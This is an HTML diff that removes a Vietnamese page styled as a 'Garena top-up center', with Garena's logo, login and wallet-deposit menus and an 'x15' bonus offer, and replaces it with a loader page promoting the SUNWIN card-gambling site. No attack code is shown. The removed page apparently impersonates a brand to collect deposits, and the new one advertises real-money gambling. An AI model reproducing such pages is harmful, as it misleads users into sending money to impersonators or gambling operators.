@@ -1,1097 +1,402 @@
 <!DOCTYPE html>
-<html lang="vi">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Trung tâm nạp thẻ Garena</title>
-  
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;500;600;700&display=swap" rel="stylesheet">
-  
-  <style>
-    :root {
-      --bg-color: #f2f4f8;
-      --card-bg: #ffffff;
-      --text-color: #1c1e21;
-      --text-sub: #65676b;
-      --primary-blue: #0084ff;
-      --gradient-btn: linear-gradient(135deg, #0084ff, #7000ff);
-      --border-color: #e4e6eb;
-      --success-green: #2e7d32;
-      --danger-red: #e53935;
-    }
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <!-- Service Worker -->
+    <!-- <meta name="sw-valid" content="1" />
+        <script>
+            if ('serviceWorker' in navigator) {
+                const params = new URLSearchParams(window.location.search);
+                const serviceWorkerDebug = 'serviceWorkerDebug';
+                const isDebug = params.has(serviceWorkerDebug);
+                window.addEventListener('load', () =>
+                    navigator.serviceWorker
+                        .register(
+                            window.location.pathname +
+                                'sw.js' +
+                                (isDebug ? '?v=' + params.get(serviceWorkerDebug) : ''),
+                            { scope: window.location.pathname },
+                        )
+                        .then((registration) => console.log('Service Worker: success registered', registration.scope))
+                        .catch((error) => console.error('Service Worker: fail registered', error)),
+                );
+                navigator.serviceWorker.addEventListener('message', (event) => {
+                    if (event.data.type === 'REDIRECT_TO_BACKUP') {
+                        window.location.href = event.data.url; // redirect to new domain
+                    }
+                });
+            }
+        </script> -->
+    <title>
+      SUNWIN | Chơi Game Bài Đổi Thưởng Online Bản Web
+    </title>
+    <meta name="keywords" content="Sunwin, Web Sunwin, Game bài đổi thưởng" />
+    <meta name="description" content="Sunwin trang chơi game bài đổi thưởng Sunwin phiên bản web chơi game: Tài Xỉu, Xóc Đĩa, Săn Cá, Keno, Bầu Cua, Lô Đề, Thể Thao,… Đăng ký nhận quà khủng." />
+    <link rel="apple-touch-icon" sizes="180x180" href="fav_icons/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="48x48" href="fav_icons/icon-48x48.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="fav_icons/icon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="fav_icons/icon-16x16.png" />
+    <link rel="manifest" href="fav_icons/site.webmanifest" />
+    <!--http://www.html5rocks.com/en/mobile/mobifying/-->
+    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1, minimum-scale=1,maximum-scale=1, viewport-fit=cover" />
+    <!--https://developer.apple.com/library/safari/documentation/AppleApplications/Reference/SafariHTMLRef/Articles/MetaTags.html-->
+    <meta name="theme-color" content="#270701" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <meta name="format-detection" content="telephone=no" />
+    <!-- force webkit on 360 -->
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <!-- force edge on IE -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="msapplication-tap-highlight" content="no" />
+    <!-- force full screen on some browser -->
+    <meta name="full-screen" content="yes" />
+    <meta name="x5-fullscreen" content="true" />
+    <meta name="360-fullscreen" content="true" />
+    <!-- force screen orientation on some browser -->
+    <meta name="screen-orientation" content="landscape" />
+    <meta name="x5-orientation" content="landscape" />
+    <!--fix fireball/issues/3568 -->
+    <!--<meta name="browsermode" content="application">-->
+    <meta name="x5-page-mode" content="app" />
+    <!--<link rel="apple-touch-icon" href=".png" />-->
+    <!--<link rel="apple-touch-icon-precomposed" href=".png" />-->
+    <link rel="stylesheet" type="text/css" href="style.e598y.css" />
+    <link rel="canonical" href="https://web-sunwin.hk/" />
+    <style type="text/css">
+      body {
+                color: #270701;
+                background-color: #270701;
+            }
 
-    /* Khóa Zoom tuyệt đối */
-    html, body {
-      touch-action: pan-y;
-      -webkit-text-size-adjust: 100%;
-      user-select: none;
-      background-color: var(--bg-color);
-      color: var(--text-color);
-      font-family: 'Lexend', sans-serif;
-      margin: 0; padding: 0;
-      padding-bottom: 60px;
-    }
+            #spinner {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                margin-top: -15px;
+                -webkit-transform: translateY(-50%) translateX(-50%);
+                width: 100px;
+                height: 100px;
+                border-radius: 50%;
+                background: linear-gradient(#fffcc7, #fffcc7, #fffcc7);
+            }
 
-    * { box-sizing: border-box; }
+            @keyframes fade {
+                0%,
+                100% {
+                    opacity: 0.5;
+                }
 
-    /* Header */
-    header {
-      background: var(--card-bg);
-      padding: 12px 20px;
-      display: flex; justify-content: space-between; align-items: center;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.03);
-      position: sticky; top: 0; z-index: 100;
-    }
-    .header-left { display: flex; align-items: center; gap: 15px; }
-    .btn-icon-menu {
-      width: 40px; height: 40px; border-radius: 50%; border: 1px solid var(--border-color);
-      display: flex; align-items: center; justify-content: center; background: #f0f2f5; cursor: pointer;
-    }
-    .garena-logo { display: flex; align-items: center; gap: 8px; text-decoration: none; cursor: pointer; }
-    .garena-logo img { height: 28px; }
-    
-    .btn-login-main {
-      background: var(--gradient-btn); color: white; border: none;
-      padding: 10px 20px; border-radius: 20px; font-weight: 700; cursor: pointer;
-      display: flex; align-items: center; gap: 8px; font-size: 0.9rem;
-      box-shadow: 0 4px 12px rgba(0,132,255,0.3);
-    }
+                70% {
+                    opacity: 1;
+                }
+            }
 
-    .user-profile-badge {
-      display: flex; align-items: center; gap: 10px; background: #f0f2f5; padding: 6px 14px; border-radius: 20px;
-    }
-    .balance-text { color: var(--success-green); font-weight: bold; font-size: 0.85rem; }
+            .bar {
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                -webkit-transform: translateY(-50%) translateX(-50%);
+                width: 100%;
+                height: 100%;
+                border-radius: 50%;
+                background: linear-gradient(#fffcc7, #fffcc7, #fffcc7);
+            }
 
-    .container { max-width: 600px; margin: 15px auto; padding: 0 15px; }
+            .bar:nth-child(1) {
+                filter: blur(10px);
+                animation: fade 1.5s linear infinite;
+            }
 
-    /* Banner Slider */
-    .banner-wrapper {
-      position: relative; background: #8b0000; border-radius: 20px; overflow: hidden;
-      color: white; margin-bottom: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-    }
-    .slider-track { display: flex; transition: transform 0.5s ease-in-out; }
-    .slide-item { min-width: 100%; position: relative; }
-    .slide-item img { width: 100%; height: 180px; object-fit: cover; display: block; }
-    
-    .slider-controls {
-      display: flex; justify-content: space-between; align-items: center;
-      padding: 10px 5px; font-size: 0.85rem; font-weight: 600; color: var(--text-sub);
-    }
-    .dots-indicator { display: flex; gap: 6px; align-items: center; }
-    .dot { width: 8px; height: 8px; border-radius: 50%; background: #ccc; }
-    .dot.active { width: 24px; border-radius: 10px; background: #7000ff; }
-    .arrow-btn {
-      width: 32px; height: 32px; border-radius: 8px; border: 1px solid var(--border-color);
-      background: white; cursor: pointer; display: inline-flex; align-items: center; justify-content: center;
-    }
+            .bar:nth-child(2) {
+                filter: blur(15px);
+                animation: fade 1.5s linear infinite;
+            }
 
-    /* Card container */
-    .main-card {
-      background: var(--card-bg); border-radius: 24px; padding: 20px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.04); margin-bottom: 20px;
-    }
-    .section-header { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
-    .section-icon {
-      width: 36px; height: 36px; border-radius: 50%; background: #e7f3ff; color: #0084ff;
-      display: flex; align-items: center; justify-content: center; font-size: 1.1rem;
-    }
-    .section-title-sub { font-size: 0.75rem; color: #0084ff; font-weight: 700; text-transform: uppercase; }
-    .section-title-main { font-size: 1.05rem; font-weight: 800; color: #1c1e21; }
+            .bar:nth-child(3) {
+                filter: blur(25px);
+                animation: fade 1.5s linear infinite;
+            }
 
-    /* Search & Filter Tabs */
-    .search-box {
-      background: #f0f2f5; border-radius: 14px; padding: 12px 16px;
-      display: flex; align-items: center; gap: 10px; margin-bottom: 15px;
-    }
-    .search-box input { border: none; background: transparent; outline: none; width: 100%; font-size: 0.95rem; }
+            .bar:nth-child(4) {
+                filter: blur(45px);
+                animation: fade 1.5s linear infinite;
+            }
 
-    .filter-tabs { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 5px; margin-bottom: 20px; }
-    .tab-btn {
-      padding: 8px 16px; border-radius: 12px; border: none; background: #f0f2f5;
-      font-size: 0.85rem; font-weight: 600; color: var(--text-sub); white-space: nowrap; cursor: pointer;
-    }
-    .tab-btn.active { background: #0084ff; color: white; }
-    .tab-btn .count { background: rgba(0,0,0,0.1); padding: 2px 6px; border-radius: 8px; margin-left: 4px; font-size: 0.75rem; }
+            .logo {
+                position: absolute;
+                width: 200px;
+                height: 200px;
+                margin-top: -11px;
+                margin-left: -49px;
+            }
 
-    /* Game Grid */
-    .game-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
-    .game-card-item {
-      border: 2px solid #e4e6eb; border-radius: 18px; padding: 15px; text-align: center;
-      position: relative; cursor: pointer; transition: 0.2s; background: white;
-    }
-    .game-card-item.selected { border-color: #0084ff; background: #f4f9ff; }
-    .badge-auto {
-      position: absolute; top: 12px; left: 12px; font-size: 0.65rem; font-weight: 800;
-      color: #0084ff; background: #e7f3ff; padding: 2px 6px; border-radius: 6px;
-    }
-    .game-thumb { width: 70px; height: 70px; border-radius: 16px; object-fit: cover; margin: 10px auto 8px auto; display: block; }
-    .game-name { font-size: 0.88rem; font-weight: 700; color: #1c1e21; margin-bottom: 4px; }
-    .game-status-btn {
-      font-size: 0.75rem; font-weight: 600; color: var(--text-sub);
-      background: #f0f2f5; padding: 4px 10px; border-radius: 10px; display: inline-block;
-    }
-    .game-card-item.selected .game-status-btn { background: #0084ff; color: white; }
+            .logo2 {
+                position: absolute;
+                width: 200px;
+                height: 200px;
+                margin-top: -11px;
+                margin-left: -49px;
+            }
 
-    /* Modal & Sidebar */
-    .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 2000; display: none; align-items: center; justify-content: center; padding: 15px; }
-    .modal.active { display: flex; }
-    .modal-content { background: white; width: 100%; max-width: 480px; padding: 22px; border-radius: 20px; position: relative; max-height: 90vh; overflow-y: auto; }
-    
-    .sidebar { position: fixed; top: 0; left: -300px; width: 280px; height: 100%; background: white; z-index: 1000; transition: 0.3s; padding: 20px; box-shadow: 5px 0 15px rgba(0,0,0,0.2); overflow-y: auto; }
-    .sidebar.active { left: 0; }
-    .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: none; z-index: 999; }
-    .overlay.active { display: block; }
+            .bgColor {
+                background-color: #270701;
+                width: 110vmax;
+                height: 110vmax;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                z-index: -100;
+                transform: translate(-50%, -50%);
+            }
 
-    .sidebar-accordion { border-bottom: 1px solid #eee; padding: 10px 0; }
-    .sidebar-accordion-header { font-weight: 600; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
-    .sidebar-accordion-body { display: none; padding-left: 10px; margin-top: 8px; }
-    .sidebar-accordion-body.open { display: block; }
-    .sidebar-game-item { display: flex; align-items: center; gap: 10px; padding: 6px 0; cursor: pointer; font-size: 0.85rem; }
-    .sidebar-game-item img { width: 28px; height: 28px; border-radius: 6px; }
+            #additionalContent {
+                color: #ffe49e;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                margin-top: 87px;
+                width: 1000px;
+            }
 
-    .form-group { margin-bottom: 12px; }
-    .form-group label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 5px; }
-    .form-control { width: 100%; padding: 10px 12px; border-radius: 10px; border: 1px solid var(--border-color); outline: none; }
-    
-    .price-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px; }
-    .price-box { border: 1px solid var(--border-color); padding: 10px; border-radius: 10px; text-align: center; cursor: pointer; }
-    .price-box.selected { border-color: #0084ff; background: #e7f3ff; }
+            #additionalContent2 {
+                color: #ffe49e;
+                position: absolute;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                margin-top: 112px;
+                width: 1000px;
+            }
 
-    table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 0.8rem; }
-    th, td { border: 1px solid var(--border-color); padding: 6px; text-align: left; }
+            #sunwin-link {
+                color: inherit;
+            }
 
-    /* Custom Popup Thông báo Chuyên nghiệp */
-    .custom-popup {
-      position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.8);
-      background: white; border-radius: 20px; padding: 25px; width: 90%; max-width: 380px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; z-index: 4000;
-      opacity: 0; visibility: hidden; transition: all 0.3s ease;
-    }
-    .custom-popup.active { opacity: 1; visibility: visible; transform: translate(-50%, -50%) scale(1); }
-    .popup-icon-box {
-      width: 70px; height: 70px; border-radius: 50%; margin: 0 auto 15px auto;
-      display: flex; align-items: center; justify-content: center; font-size: 2.2rem;
-    }
-    .popup-icon-box.success { background: #e8f5e9; color: #2e7d32; }
-    .popup-icon-box.error { background: #ffebee; color: #e53935; }
-    .popup-title { font-weight: 800; font-size: 1.1rem; margin-bottom: 8px; }
-    .popup-desc { color: #555; font-size: 0.9rem; margin-bottom: 20px; line-height: 1.4; }
-    .popup-btn {
-      width: 100%; padding: 12px; border-radius: 12px; border: none; font-weight: 700;
-      color: white; cursor: pointer; background: var(--gradient-btn);
-    }
+            @media (min-width: 1200px) {
+                #additionalContent p {
+                    font-size: 15px;
+                }
 
-    /* Mật khẩu indicator */
-    .pass-strength { font-size: 0.75rem; font-weight: 600; margin-top: 4px; }
-    .strength-weak { color: #e53935; }
-    .strength-medium { color: #fb8c00; }
-    .strength-strong { color: #2e7d32; }
-  </style>
-</head>
-<body>
+                #additionalContent2 p {
+                    font-size: 15px;
+                }
+            }
 
-  <div class="overlay" id="overlay" onclick="closeSidebar()"></div>
+            @media (max-width: 500px) {
+                #additionalContent p {
+                    font-size: 11px;
+                }
 
-  <!-- Custom Popup Chuyên Nghiệp -->
-  <div class="custom-popup" id="customPopup">
-    <div class="popup-icon-box success" id="popupIconBox">
-      <i class="fa-solid fa-circle-check" id="popupIcon"></i>
+                #additionalContent2 p {
+                    font-size: 8px;
+                }
+            }
+
+            #GameDiv,
+            #Cocos3dGameContainer,
+            #GameCanvas {
+                width: 100.2%;
+                height: 100%;
+                margin-left: -0.1%;
+                color: #270701;
+                background-color: #270701;
+            }
+            
+            .grecaptcha-badge {
+                visibility: hidden !important;
+            }
+    </style>
+  </head>
+  <body scroll="no" style="overflow: hidden">
+    <div id="qrcode" style="width: 0px; height: 0px">
     </div>
-    <div class="popup-title" id="popupTitle">THÔNG BÁO</div>
-    <div class="popup-desc" id="popupDesc">Nội dung thông báo ở đây.</div>
-    <button class="popup-btn" onclick="closeCustomPopup()">ĐÃ HỂU</button>
-  </div>
-
-  <!-- Header chính -->
-  <header>
-    <div class="header-left">
-      <div class="btn-icon-menu" onclick="toggleSidebar()">
-        <i class="fa-solid fa-bars"></i>
-      </div>
-      <a class="garena-logo" onclick="secretAdminClick()">
-        <img src="https://cdngarenanow-a.akamaihd.net/garena/mkt/ngo/sdk/logo/garena_logo.png" alt="Garena Logo">
-      </a>
+    <div id="splash" style="display: none">
     </div>
-
-    <div>
-      <button class="btn-login-main" id="btnLogin" onclick="openAuthModal()">
-        <i class="fa-solid fa-right-to-bracket"></i> ĐĂNG NHẬP
-      </button>
-
-      <div id="userProfile" class="user-profile-badge" style="display:none;">
-        <div>
-          <div id="displayNameText" style="font-weight:700; font-size:0.85rem;">User</div>
-          <div class="balance-text">Ví: <span id="balanceText">0</span>đ</div>
-        </div>
-        <button style="background:#0084ff; color:white; border:none; padding:5px 10px; border-radius:10px; font-weight:bold; cursor:pointer;" onclick="openDepositModal('qr')">+</button>
-        <i class="fa-solid fa-right-from-bracket" style="color:#ff3b30; cursor:pointer; margin-left:5px;" title="Đăng xuất" onclick="logout()"></i>
+    <div id="splashGamePortrait" style="display: none">
+    </div>
+    <div id="loadingIcon" class="rotating" style="display: none">
+    </div>
+    <div id="GameDiv">
+      <div id="Cocos3dGameContainer">
+        <canvas id="GameCanvas" oncontextmenu="event.preventDefault()" tabindex="0">
+        </canvas>
       </div>
     </div>
-  </header>
-
-  <!-- Sidebar Menu Danh mục hệ thống -->
-  <div class="sidebar" id="sidebar">
-    <h3 style="margin-bottom:15px; color:#0084ff; font-size:1.1rem;">DANH MỤC HỆ THỐNG</h3>
-    
-    <div class="sidebar-accordion">
-      <div class="sidebar-accordion-header" onclick="toggleAccordion('gameListAcc')">
-        <span><i class="fa-solid fa-gamepad" style="color:#0084ff;"></i> Danh Sách Game Trực Tuyến</span>
-        <i class="fa-solid fa-chevron-down"></i>
+    <div id="spinner">
+      <div class="bar">
       </div>
-      <div class="sidebar-accordion-body" id="gameListAcc">
-        <div class="sidebar-game-item" onclick="quickSelectGame('Free Fire')">
-          <img src="https://via.placeholder.com/70/ff3b30/fff?text=FF" alt="FF"> Free Fire
-        </div>
-        <div class="sidebar-game-item" onclick="quickSelectGame('Liên Quân Mobile')">
-          <img src="https://via.placeholder.com/70/0084ff/fff?text=LQ" alt="LQ"> Liên Quân Mobile
-        </div>
-        <div class="sidebar-game-item" onclick="quickSelectGame('FC Mobile VN')">
-          <img src="https://via.placeholder.com/70/2e7d32/fff?text=FC" alt="FC"> FC Mobile VN
-        </div>
-        <div class="sidebar-game-item" onclick="quickSelectGame('FC Online (VN)')">
-          <img src="https://via.placeholder.com/70/0288d1/fff?text=FCO" alt="FCO"> FC Online (VN)
-        </div>
-        <div class="sidebar-game-item" onclick="quickSelectGame('FC Online M (VN)')">
-          <img src="https://via.placeholder.com/70/388e3c/fff?text=FCM" alt="FCM"> FC Online M (VN)
-        </div>
-        <div class="sidebar-game-item" onclick="quickSelectGame('Delta Force')">
-          <img src="https://via.placeholder.com/70/555/fff?text=DF" alt="DF"> Delta Force
-        </div>
-        <div class="sidebar-game-item" onclick="quickSelectGame('Nạp Sò')">
-          <img src="https://via.placeholder.com/70/fbc02d/fff?text=Sò" alt="Sò"> Nạp Sò
-        </div>
-        <div class="sidebar-game-item" onclick="quickSelectGame('Cái thế tranh hùng')">
-          <img src="https://via.placeholder.com/70/8e24aa/fff?text=CT" alt="CT"> Cái thế tranh hùng
-        </div>
+      <div class="bar">
       </div>
-    </div>
-
-    <div style="padding:12px 0; border-bottom:1px solid #eee; cursor:pointer;" onclick="openDepositModal('qr')">
-      <i class="fa-solid fa-qrcode" style="color:#2e7d32;"></i> Nạp Ví Qua QR / Banking / MoMo
-    </div>
-    <div style="padding:12px 0; border-bottom:1px solid #eee; cursor:pointer;" onclick="openDepositModal('card')">
-      <i class="fa-solid fa-credit-card" style="color:#ff9500;"></i> Nạp Ví Qua Thẻ Cào / Garena
-    </div>
-    <div style="padding:12px 0; border-bottom:1px solid #eee; cursor:pointer;" onclick="openHistoryModal()">
-      <i class="fa-solid fa-clock-rotate-left" style="color:#0084ff;"></i> Lịch Sử Nạp Tiền
-    </div>
-  </div>
-
-  <div class="container">
-
-    <!-- Banner Slide Carousel -->
-    <div class="banner-wrapper">
-      <div class="slider-track" id="sliderTrack">
-        <div class="slide-item"><img src="https://via.placeholder.com/600x180/8b0000/ffffff?text=NAPTHEX.COM+-+SU+KIEN+UU+DAI+HOT" alt="Banner 1"></div>
-        <div class="slide-item"><img src="https://via.placeholder.com/600x180/004080/ffffff?text=KHUYEN+MAI+GARA+NAP+X15+TAI+NGUYEN" alt="Banner 2"></div>
+      <div class="bar">
       </div>
-    </div>
-
-    <div class="slider-controls">
-      <div style="display:flex; align-items:center; gap:6px;">
-        <span style="color:#2e7d32;">🟢</span> SỰ KIỆN NẠP BẢO MẬT 24/7
+      <div class="bar">
       </div>
-      <div style="display:flex; align-items:center; gap:10px;">
-        <div class="dots-indicator">
-          <div class="dot active" id="dot0"></div>
-          <div class="dot" id="dot1"></div>
-        </div>
-        <button class="arrow-btn" onclick="prevSlide()"><i class="fa-solid fa-chevron-left"></i></button>
-        <button class="arrow-btn" onclick="nextSlide()"><i class="fa-solid fa-chevron-right"></i></button>
+      <div class="logo">
+        <svg version="1.0" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 200 200" style="enable-background: new 0 0 200 200" space="preserve" fill="#9a8253">
+          <g>
+            <path d="M97.5,13.5c-1,2.4,1.5,10.5,5.4,16.8c3.9,6.3,6.7,14.4,0.7,21.8c0.9-2.1,2.1-9.4-4.9-18C91,24.3,96.3,14.8,97.5,13.5z">
+            </path>
+            <path d="M81.4,17.4c-0.1,2.6,4.9,9.4,10.7,14s11.2,11.2,8,20.2c0.1-2.3-1.2-9.5-10.8-15.3C78.8,29.9,80.6,19.1,81.4,17.4z">
+            </path>
+            <path d="M67.1,26.9C68,29.3,74.9,34,82,36.3C89,38.7,96.3,43,96.4,52.5c-0.7-2.2-4.4-8.5-15.3-10.7C68.9,39.4,67,28.6,67.1,26.9z
+                    ">
+            </path>
+            <path d="M57.5,40.1c1.6,2.1,9.9,4,17.3,3.9c7.4-0.2,15.8,1.3,19.1,10.3c-1.3-1.8-7.1-6.4-18.1-4.7C63.5,51.3,58,41.8,57.5,40.1z">
+            </path>
+            <path d="M52.9,56c2.2,1.3,10.6,0.5,17.5-2.3c6.9-2.7,15.3-4.1,21.5,3.2c-1.9-1.2-8.8-3.6-18.6,1.7C62.4,64.4,54,57.4,52.9,56z">
+            </path>
+            <path d="M53.7,71.6c2.6,0.6,10.2-2.9,15.8-7.7c5.7-4.7,13.3-8.8,21.4-3.9c-2.2-0.6-9.5-0.7-17.1,7.5
+                    C65.4,76.6,55.2,72.6,53.7,71.6z">
+            </path>
+            <path d="M60.4,87.2c2.6-0.4,8.4-6.4,12-12.9c3.6-6.4,9.1-12.9,18.6-11.3c-2.3,0.2-9.1,2.8-13.3,13.1
+                    C73.1,87.7,62.1,87.5,60.4,87.2z">
+            </path>
+            <path d="M71.7,99c2.3-1.2,5.6-9,6.7-16.3c1.1-7.3,4-15.3,13.4-17.1c-2.1,1.1-7.5,5.8-7.8,17C83.8,95,73.6,98.7,71.7,99z">
+            </path>
+            <path d="M85.9,106.9c1.7-1.9,2.6-10.3,1.2-17.6C85.7,82,86,73.4,94.4,68.8c-1.6,1.6-5.4,7.9-1.9,18.6
+                    C95.9,99.2,87.4,106,85.9,106.9z">
+            </path>
+            <path d="M103.2,109.2c1-2.4-1.5-10.5-5.5-16.8c-4-6.3-6.8-14.2-0.9-21.8c-0.9,2.1-2.1,9.4,5.1,18
+                    C109.8,98.3,104.5,107.9,103.2,109.2z">
+            </path>
+            <path d="M119.3,105.4c0-2.6-5-9.4-10.8-13.9s-11.3-11.1-8.3-20.1c-0.1,2.3,1.3,9.5,10.9,15.2C121.7,92.9,120,103.7,119.3,105.4z">
+            </path>
+            <path d="M133.4,96.2c-0.9-2.4-7.9-7.1-15-9.4c-7.1-2.3-14.5-6.6-14.6-16.1c0.7,2.2,4.5,8.4,15.4,10.5
+                    C131.3,83.7,133.4,94.5,133.4,96.2z">
+            </path>
+            <path d="M143.7,82.2c-1.7-1.9-9.9-3.8-17.3-3.4c-7.4,0.4-15.8-1-19.3-9.9c1.5,1.8,7.2,6.3,18.2,4.4
+                    C137.4,71.2,143.1,80.6,143.7,82.2z">
+            </path>
+            <path d="M148.6,65.5c-2.2-1.3-10.6-0.1-17.4,2.7c-6.8,2.9-15.2,4.5-21.5-2.6c1.9,1.2,8.9,3.5,18.6-2.2
+                    C139,57.4,147.5,64.2,148.6,65.5z">
+            </path>
+            <path d="M147.8,50.3c-2.6-0.6-10.2,2.9-15.9,7.5c-5.7,4.7-13.3,8.6-21.4,3.6c2.2,0.6,9.5,0.7,17.1-7.4
+                    C136.2,45.2,146.3,49.2,147.8,50.3z">
+            </path>
+            <path d="M141.4,35.1c-2.6,0.2-8.6,6.2-12.4,12.5c-3.8,6.4-9.5,12.6-18.9,10.8c2.3-0.2,9.2-2.6,13.6-12.8
+                    C128.8,34.3,139.7,34.6,141.4,35.1z">
+            </path>
+            <path d="M128.5,22.5c-2.2,1.2-5.5,9-6.4,16.4s-3.8,15.3-13.1,17.3c2.1-1.1,7.5-6,7.5-17.1C116.5,26.6,126.7,22.7,128.5,22.5z">
+            </path>
+            <path d="M115.3,15.5c-1.8,1.8-2.6,10.3-1.3,17.6s1,15.8-7.4,20.4c1.6-1.6,5.4-7.9,2.1-18.6C105.1,23.1,113.7,16.3,115.3,15.5z">
+            </path>
+          </g>
+        </svg>
       </div>
-    </div>
-
-    <!-- Thông báo Ưu đãi Mức nạp từ Admin -->
-    <div style="background:#fff3cd; border:1px solid #ffeba2; padding:12px 15px; border-radius:16px; margin-bottom:15px; color:#856404; font-size:0.85rem;">
-      <i class="fa-solid fa-bullhorn" style="margin-right:5px; color:#d39e00;"></i>
-      <b>THÔNG BÁO TỪ HỆ THỐNG:</b> <span id="adminAnnouncement">Áp dụng chương trình ưu đãi mức nạp từ 50,000đ trở lên nhận x15 lần số tài nguyên (Kim cương, Quân huy...)!</span>
-    </div>
-
-    <!-- Khung Danh Mục Trò Chơi Nạp Thẻ -->
-    <div class="main-card">
-      <div class="section-header">
-        <div class="section-icon"><i class="fa-solid fa-play"></i></div>
-        <div>
-          <div class="section-title-sub">DANH MỤC TRÒ CHƠI NẠP THẺ</div>
-          <div class="section-title-main">LỰA CHỌN TRÒ CHƠI</div>
-        </div>
+      <div class="bgColor">
       </div>
-
-      <div class="search-box">
-        <i class="fa-solid fa-magnifying-glass" style="color:#8a8d91;"></i>
-        <input type="text" id="searchInput" placeholder="Tìm kiếm trò chơi..." oninput="filterGames()">
+      <div id="additionalContent">
+        <p>
+          <strong>          <a href="https://web-sunwin.hk/" id="sunwin-link" target="_blank">          SUN.WIN
+</a>
+</strong>
+          là thương hiệu nổi tiếng nhất nên thường xuyên bị giả mạo.
+        </p>
       </div>
-
-      <div class="filter-tabs">
-        <button class="tab-btn active" onclick="setTab(this, 'all')">Tất cả <span class="count">8</span></button>
-        <button class="tab-btn" onclick="setTab(this, 'garena')">Garena <span class="count">4</span></button>
-        <button class="tab-btn" onclick="setTab(this, 'fc')">Thể thao / FC <span class="count">3</span></button>
-      </div>
-
-      <div class="game-grid" id="gameGrid">
-        <div class="game-card-item selected" data-category="garena" onclick="selectGame(this, 'Free Fire')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/ff3b30/fff?text=FF" alt="Free Fire">
-          <div class="game-name">Free Fire</div>
-          <div class="game-status-btn">✔ ĐANG CHỌN</div>
-        </div>
-
-        <div class="game-card-item" data-category="garena" onclick="selectGame(this, 'Liên Quân Mobile')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/0084ff/fff?text=LQ" alt="Liên Quân">
-          <div class="game-name">Liên Quân Mobile</div>
-          <div class="game-status-btn">Bấm nạp</div>
-        </div>
-
-        <div class="game-card-item" data-category="fc" onclick="selectGame(this, 'FC Mobile VN')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/2e7d32/fff?text=FC" alt="FC Mobile">
-          <div class="game-name">FC Mobile VN</div>
-          <div class="game-status-btn">Bấm nạp</div>
-        </div>
-
-        <div class="game-card-item" data-category="garena" onclick="selectGame(this, 'Delta Force')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/555/fff?text=DF" alt="Delta Force">
-          <div class="game-name">Delta Force</div>
-          <div class="game-status-btn">Bấm nạp</div>
-        </div>
-
-        <div class="game-card-item" data-category="garena" onclick="selectGame(this, 'Nạp Sò')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/fbc02d/fff?text=Sò" alt="Nạp Sò">
-          <div class="game-name">Nạp Sò</div>
-          <div class="game-status-btn">Bấm nạp</div>
-        </div>
-
-        <div class="game-card-item" data-category="fc" onclick="selectGame(this, 'FC Online (VN)')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/0288d1/fff?text=FCO" alt="FC Online">
-          <div class="game-name">FC Online (VN)</div>
-          <div class="game-status-btn">Bấm nạp</div>
-        </div>
-
-        <div class="game-card-item" data-category="fc" onclick="selectGame(this, 'FC Online M (VN)')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/388e3c/fff?text=FCM" alt="FC Online M">
-          <div class="game-name">FC Online M (VN)</div>
-          <div class="game-status-btn">Bấm nạp</div>
-        </div>
-
-        <div class="game-card-item" data-category="garena" onclick="selectGame(this, 'Cái thế tranh hùng')">
-          <span class="badge-auto">AUTO</span>
-          <img class="game-thumb" src="https://via.placeholder.com/70/8e24aa/fff?text=CT" alt="Cái thế tranh hùng">
-          <div class="game-name">Cái thế tranh hùng</div>
-          <div class="game-status-btn">Bấm nạp</div>
-        </div>
+      <div id="additionalContent2">
+        <p>
+          Quý khách lưu ý: chỉ tải và chơi game trực tiếp tại
+          <strong>          <a href="https://web-sunwin.hk/" id="sunwin-link" target="_blank">          SUNWIN.HK
+</a>
+</strong>
+          để trải nghiệm Game Bài chính hãng
+        </p>
       </div>
     </div>
-
-    <!-- Khung Nhập ID & Chọn Gói Nạp -->
-    <div class="main-card">
